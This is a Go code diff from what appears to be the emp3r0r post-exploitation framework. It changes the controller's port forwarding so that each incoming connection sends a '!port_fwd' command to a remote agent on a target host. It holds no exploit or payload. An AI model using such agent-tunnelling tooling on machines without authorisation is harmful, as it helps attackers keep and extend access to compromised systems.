@@ -10,6 +10,7 @@ import (
 
 	"github.com/fatih/color"
 	"github.com/google/uuid"
+	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
 )
 
 // PortFwdSession holds controller interface of a port-fwd session
@@ -18,9 +19,9 @@ type PortFwdSession struct {
 	Tport       string // to_port
 	Description string // fmt.Sprintf("%s (Local) -> %s (Agent)", listenPort, toPort)
 
-	Sh     *StreamHandler     // related to HTTP handler
-	Ctx    context.Context    // PortFwd context
-	Cancel context.CancelFunc // PortFwd cancel
+	Sh     map[string]*StreamHandler // related to HTTP handler
+	Ctx    context.Context           // PortFwd context
+	Cancel context.CancelFunc        // PortFwd cancel
 }
 
 // ListPortFwds list currently active port mappings
@@ -44,15 +45,22 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 	*/
 
 	handlePerConn := func(conn net.Conn, fwdID string) {
-		var err error
+		var (
+			err   error
+			sh    *StreamHandler
+			exist bool
+		)
 
-		pf, exist := PortFwds[fwdID]
-		if !exist {
-			return
+		// wait for agent to connect
+		for i := 0; i < 100; i++ {
+			time.Sleep(200 * time.Millisecond)
+			sh, exist = pf.Sh[fwdID]
+			if exist {
+				break
+			}
 		}
-		sh := pf.Sh
-		if sh == nil {
-			CliPrintWarning("PortFwd: StreamHandler not found")
+		if !exist {
+			CliPrintWarning("handlePerConn timeout")
 			return
 		}
 
@@ -62,6 +70,7 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 		cleanup := func() {
 			_, _ = conn.Write([]byte("exit"))
 			conn.Close()
+			sh.H2x.Conn.Close()
 			CliPrintInfo("PortFwd conn handler (%s) finished", conn.RemoteAddr().String())
 			connCancel()
 		}
@@ -104,13 +113,6 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 	_, e2 := strconv.Atoi(listenPort)
 	if e1 != nil || e2 != nil {
 		return fmt.Errorf("Invalid port: %v (to_port), %v (listen_port)", e1, e2)
-	}
-
-	// is this mapping already active?
-	for id, session := range PortFwds {
-		if session.Description == pf.Description {
-			return fmt.Errorf("Such mapping already exists:\n%s", id)
-		}
 	}
 
 	fwdID := uuid.New().String()
@@ -159,11 +161,21 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 		}
 
 		// listen
-		conn, err := ln.Accept()
-		if err != nil {
-			return err
+		conn, e := ln.Accept()
+		if e != nil {
+			CliPrintError("Listening on port %s: %v", p.Lport, e)
 		}
-		handlePerConn(conn, fwdID)
+
+		go func() {
+			shID := fmt.Sprintf("%s_%d", fwdID, agent.RandInt(0, 1024))
+			cmd = fmt.Sprintf("!port_fwd %s %s", toPort, shID)
+			err = SendCmd(cmd, CurrentTarget)
+			if err != nil {
+				CliPrintError("SendCmd: %v", err)
+				return
+			}
+			handlePerConn(conn, shID)
+		}()
 	}
 
 	return
